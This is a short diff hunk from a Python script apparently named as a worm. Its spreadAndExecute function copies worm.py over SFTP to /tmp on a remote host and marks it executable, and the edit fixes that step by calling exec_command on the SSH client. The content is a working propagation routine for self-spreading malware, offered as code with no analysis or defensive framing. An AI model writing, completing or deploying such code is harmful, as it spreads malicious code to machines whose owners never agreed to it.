@@ -78,7 +78,7 @@ def spreadAndExecute(sshClient):
     currentDirectory = os.getcwd()
     client = sshClient.open_sftp()
     client.put("worm.py", "/tmp/" + "worm.py")
-    client.exec_command('chmod a+x /tmp/worm.py')
+    sshClient.exec_command('chmod a+x /tmp/worm.py')
     client.close()
 
 
